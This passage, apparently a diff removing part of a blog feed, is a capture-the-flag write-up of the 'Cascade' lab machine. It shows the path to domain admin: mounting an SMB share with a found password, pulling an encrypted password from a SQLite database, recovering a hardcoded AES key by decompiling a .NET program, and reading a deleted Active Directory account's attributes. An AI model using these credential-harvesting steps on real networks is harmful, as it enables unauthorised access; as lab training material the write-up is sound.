-<p><em>As expected,</em> the password belonged to the <code class="language-plaintext highlighter-rouge">s.smith</code> user.</p>
-
-<p>He also has <strong>WinRM</strong> access :D</p>
-
-<p><img src="/assets/Cascade/steve-winrm-access.jpg" alt="steve-winrm-access" /></p>
-
-<p>The user flag is the only significant thing that we found using his shell access.</p>
-
-<p>Running <strong>WinPeas</strong> didn’t pick up anything either. So we took a step back to check his <strong>SMB</strong> access.</p>
-
-<h2 id="steves-smb-access-the-audit-share">Steve’s SMB access: The <code class="language-plaintext highlighter-rouge">Audit$</code> Share</h2>
-<p>Using <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--shares</code> flag, we get the below:</p>
-
-<p><img src="/assets/Cascade/steve-smb-access.jpg" alt="steve-smb-access" /></p>
-
-<p>we mount the share with:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="s1">'username=s.smith,password=sT333ve2'</span> //10.10.10.182/Audit<span class="nv">$ </span>/mnt
-</code></pre></div></div>
-
-<p>and list the files with:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /mnt <span class="nt">-type</span> f 2&gt;/dev/null
-</code></pre></div></div>
-
-<p><img src="/assets/Cascade/mount-and-find.jpg" alt="mount-and-find" /></p>
-
-<p>Checking the <code class="language-plaintext highlighter-rouge">.bat</code> file, we find that the executable <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> runs with a database as an argument <code class="language-plaintext highlighter-rouge">"\\CASC-DC1\Audit$\DB\Audit.db"</code></p>
-
-<p><img src="/assets/Cascade/audit-bat-file.jpg" alt="audit-bat-file" /></p>
-
-<p><em>From the</em> <strong>SQLite</strong> <code class="language-plaintext highlighter-rouge">.dll</code> <em>files,</em> we infer that the <code class="language-plaintext highlighter-rouge">.db</code> file is of that type.</p>
-
-<p>We confirm that with <code class="language-plaintext highlighter-rouge">file</code>:</p>
-
-<p><img src="/assets/Cascade/check-out-the-db.jpg" alt="check-out-the-db" /></p>
-
-<h2 id="db-enumeration">DB Enumeration</h2>
-<p>We’re going to use the <code class="language-plaintext highlighter-rouge">sqlite3</code> command-line utility to check out the database contents.</p>
-
-<ol>
-  <li>we list the tables with: <code class="language-plaintext highlighter-rouge">.tables</code></li>
-  <li>we get the schema using <code class="language-plaintext highlighter-rouge">.schema</code></li>
-  <li>we select everything from the <code class="language-plaintext highlighter-rouge">Ldap</code> table after noticing the <code class="language-plaintext highlighter-rouge">pwd</code> field.</li>
-  <li>no new data was found in <code class="language-plaintext highlighter-rouge">DeletedUserAudit</code> table.</li>
-  <li>same for the <code class="language-plaintext highlighter-rouge">Misc</code> table as well.</li>
-</ol>
-
-<p><img src="/assets/Cascade/sqlite-db-enumeration.jpg" alt="sqlite-db-enumeration" /></p>
-
-<p>The password we found in the <code class="language-plaintext highlighter-rouge">Ldap</code> table appears to be for the <code class="language-plaintext highlighter-rouge">ArkSvc</code> user.</p>
-
-<p>Decoding it as base-64 gives us strange output. It must be encrypted.</p>
-
-<p><img src="/assets/Cascade/ark-svc-b64-attempt.jpg" alt="ark-svc-b64-attempt" /></p>
-
-<h2 id="reversing-the-cascauditexe-and-dll-files">Reversing the <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">.dll</code> files</h2>
-<p><em>Since the</em> <code class="language-plaintext highlighter-rouge">.bat</code> <em>file showed the</em> <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> <em>processing the Audit database,</em> we’re interested to know how it works.</p>
-
-<p>The same goes for <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code>. <em>Judging by its name,</em> it’s very likely related to the encryption.</p>
-
-<p>Doing a <code class="language-plaintext highlighter-rouge">file</code> command against the <code class="language-plaintext highlighter-rouge">CascAudit</code> files tells us they are built with <code class="language-plaintext highlighter-rouge">.Net</code></p>
-
-<p><img src="/assets/Cascade/inspecting-cascaudit-files.jpg" alt="inspecting-cascaudit-files" /></p>
-
-<p><em>Because of an amazing tool called</em> <code class="language-plaintext highlighter-rouge">DNSpy</code> (https://github.com/dnSpy/dnSpy), reversing <code class="language-plaintext highlighter-rouge">.Net</code> is simple.</p>
-
-<p>Opening the <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> with <code class="language-plaintext highlighter-rouge">DNSpy.exe</code> shows two important functions: <code class="language-plaintext highlighter-rouge">EncryptString</code> and <code class="language-plaintext highlighter-rouge">DecryptString</code></p>
-
-<p><img src="/assets/Cascade/dnspy-casc-crypto-dll.jpg" alt="dnspy-casc-crypto-dll" /></p>
-
-<p>A great deal of information is present regarding the encryption:</p>
-<ol>
-  <li><strong>Type:</strong> AES</li>
-  <li><strong>Block Size:</strong> 128-bit</li>
-  <li><strong>Key Size:</strong> 128-bit</li>
-  <li><strong>Initialization Vector (IV):</strong> <code class="language-plaintext highlighter-rouge">1tdyjCbY1Ix49842</code></li>
-  <li><strong>Mode:</strong> CBC</li>
-</ol>
-
-<p>We need just the key to be able to decrypt the <code class="language-plaintext highlighter-rouge">ArkSvc</code> password found in the DB. Or so we hope :D</p>
-
-<p>We find the it in the <code class="language-plaintext highlighter-rouge">.exe</code> code</p>
-
-<p><img src="/assets/Cascade/dnspy-casc-exe.jpg" alt="dnspy-casc-exe" /></p>
-
-<p>it’s <strong>“c4scadek3y654321”</strong></p>
-
-<p><em>Looking at the code,</em> it seems that the <code class="language-plaintext highlighter-rouge">.exe</code> reads the encrypted password from the database and decrypts it using the <code class="language-plaintext highlighter-rouge">DecryptString</code> function before moving on to carry out its tasks.</p>
-
-<h2 id="aes-cbc-128-decryption">AES-CBC-128 Decryption</h2>
-<p><em>Adding the details we found into an</em> <strong>online decryption tool</strong> (https://www.devglan.com/online-tools/aes-encryption-decryption), we get the plaintext: <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code></p>
-
-<p><img src="/assets/Cascade/aes-cbc-128-decryption.jpg" alt="aes-cbc-128-decryption" /></p>
-
-<h2 id="arksvc-and-the-ad-recycle-bin">ArkSvc and the AD Recycle Bin</h2>
-<p>The user <code class="language-plaintext highlighter-rouge">ArkSvc</code> authenticates successfully with the <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code> password and also has <code class="language-plaintext highlighter-rouge">WinRM</code> access.</p>
-
-<p><img src="/assets/Cascade/ark-svc-got-winrm.jpg" alt="ark-svc-got-winrm" /></p>
-
-<p><em>While doing some basic privesc checks</em>, we notice that the group membership of this user is unique:</p>
-
-<p><img src="/assets/Cascade/ark-svc-group-membership.jpg" alt="ark-svc-group-membership" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">s.smith</code> didn’t have this access.</p>
-
-<p><img src="/assets/Cascade/s-smith-group-membership.jpg" alt="s-smith-group-membership" /></p>
-
-<p>The <strong>Recycle Bin</strong> of <strong>Active Directory</strong> is important in our case because it contains the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>
-
-<p>We don’t know his password yet. But it might be similar to any of the ones we found.</p>
-
-<p>We try restoring him using <code class="language-plaintext highlighter-rouge">PowerShell</code></p>
-
-<p>The command has 3 parts:</p>
-<ol>
-  <li>Fetching all deleted objects: <code class="language-plaintext highlighter-rouge">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects</code></li>
-  <li>Selecting the last one (TempAdmin): <code class="language-plaintext highlighter-rouge">Select -Last 1 </code></li>
-  <li>Restoring It: <code class="language-plaintext highlighter-rouge">Restore-ADObject</code></li>
-</ol>
-
-<p><img src="/assets/Cascade/attempting-tempadmin-restore.jpg" alt="attempting-tempadmin-restore" /></p>
-
-<p>But that fails :/</p>
-
-<p>I scratch my head for a while…</p>
-
-<p>But eventually get the idea of checking all the attributes for the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>
-
-<p>Just in case his password was in one of them. Just like the <code class="language-plaintext highlighter-rouge">r.thompson</code> user or something.</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-ldapFilter</span><span class="p">:</span><span class="s2">"(msDS-LastKnownRDN=*)"</span><span class="w"> </span><span class="nt">-IncludeDeletedObjects</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Last</span><span class="w"> </span><span class="nx">1</span><span class="w">
-</span></code></pre></div></div>
-
-<p><img src="/assets/Cascade/temp-admin-password.jpg" alt="temp-admin-password" /></p>
-
-<p>Son of a … It was indeed the case XD</p>
-
-<p><em>And of course,</em> it was base-64 encoded.</p>
-
-<p>We decode it and try it with the <code class="language-plaintext highlighter-rouge">Administrator</code> user as mentioned in the email:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username is TempAdmin (password is the same as the normal admin account password)
-</code></pre></div></div>
-
-<p><img src="/assets/Cascade/got-admin-at-last.jpg" alt="got-admin-at-last" /></p>
-
-<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
